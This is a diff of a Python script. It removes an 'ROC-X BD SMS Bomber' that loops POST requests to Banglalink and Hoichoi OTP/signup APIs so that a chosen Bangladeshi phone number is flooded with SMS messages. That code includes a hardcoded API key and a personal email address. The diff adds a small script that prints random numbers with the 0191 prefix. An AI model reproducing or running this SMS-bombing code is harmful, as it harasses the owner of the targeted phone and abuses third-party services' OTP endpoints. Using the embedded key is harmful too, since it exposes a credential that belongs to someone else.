@@ -1,87 +1,14 @@
-import requests
-os.system('clear')
-tt=1
-header()	
-opt()
-while tt<2:
-	opt2=str(input(blue+"\n\n [>] Enter the number of option : "+yellow))
-	if opt2=="1":
-		text=cyan+"\t\tDeveloped By : Sanaur Asif"+green+"\n\n\t\t★★ ROC-X BD SMS Bomber ★★   \n" 
-		os.system('clear')
-		header()
-		number=str(input(blue+"\n\n [>] Enter The BD Number : "+yellow))
-		ammount=int(input(blue+"\n [>] Enter The Ammount : "+yellow))
-		os.system('clear')
-		notice=cyan+"\n\t   [•] ROC-X Tools in progress......\n\n"
-		header()
-		ammount2=1
-		totalsent=0
-		totalnotsent=0
-		while ammount2<ammount+1:
-			try:
-				if "yyy" in number or "yyy" in number:
-					r=requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",data={"mobile":number})
-						
-				else:
-					url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
-					headers = CaseInsensitiveDict()
-					headers["Host"] = "prod-api.viewlift.com"
-					headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
-					headers["Accept"] = "application/json, text/plain, */*"
-					headers["Accept-Language"] = "en-US,en;q=0.5"
-					headers["Accept-Encoding"] = "gzip, deflate, br"
-					headers["Content-Type"] = "application/json"
-					headers["Content-Length"] = "128"
-					headers["x-api-key"] = "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
-					headers["Origin"] = "https://www.hoichoi.tv"
-					headers["Referer"] = "https://www.hoichoi.tv/"
-					headers["Connection"] = "keep-alive"
-					data = """{\"requestType\":\"send\",\"phoneNumber\":\"+88"""+number+"""\",\"emailConsent\":true,\"whatsappConsent\":true,\"email\":\"sanaur.asif@gmail.com\"}"""
-					r= requests.post(url, headers=headers, data=data)
-												
-				if ammount2==1:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+green+"[✓] 1st SMS Sent.")
-				elif ammount2==2:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+green+"[✓] 2nd SMS Sent.")
-				elif ammount2==3:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+green+"[✓] 3rd SMS Sent.")
-				else:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+green+"[✓] "+str(ammount2)+"th SMS Sent.")
-				time.sleep(1)
-				totalsent+=1
-				ammount2+=1
-			except:
-				if ammount2==1:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+red+"[×] 1st SMS Not Sent.")
-				elif ammount2==2:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+red+"[×] 2nd SMS Not Sent.")
-				elif ammount2==3:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+red+"[×] 3rd SMS Not Sent.")
-				else:
-					print(cyan+"\n\t  ★★ROC-X★★==>   "+red+"[×] "+str(ammount2)+"th SMS Not Sent.")
-					time.sleep(10)
-					ammount2+=1
-									
-								
-		totalhit=ammount2-1
-		totalnotsent=totalhit-totalsent
-		print(cyan+"\n\n\t\t[•] Total Hits : "+yellow+str(totalhit))
-		print(green+"\n\t\t[✓] Total Sent : "+yellow+str(totalsent))
-		print(red+"\n\t\t[×] Total Not Sent : "+yellow+str(totalnotsent)+"\n")
-		lastt=str(input(cyan+"\n\n\t\t  [✓] All Done!\n\t [•] Now Press Enter Key To Continue\n"))
-		os.system('clear')
-		notice=""
-		text=green+"\n\n\t\t★★★ROC-X SMS Tools★★★   \n" 
-		header()
-		opt()
-	
-			
-	elif opt2=="3":
-		os.system("python3 main2.py")
-	else:
-		text=cyan+"\t\tDeveloped By : Sanaur Asif"+green+"\n\n\t\t★★ ROC-X BD SMS Bomber ★★   \n" 
-		notice=red+"\n\t\t[×] Wrong Value Entered"
-		os.system('clear')
-		header()
-		opt()
-		continue
+import random
+import os
+import sys
+
+
+os.system("figlet Number")
+print("[Coder] : Dead Devil")
+print("<=========================>")
+
+
+body=int(input("Enter Your Amount: "))
+for i in range(body):
+	num=str(random.randint(1111111,9999999))
+	print("0191"+num)
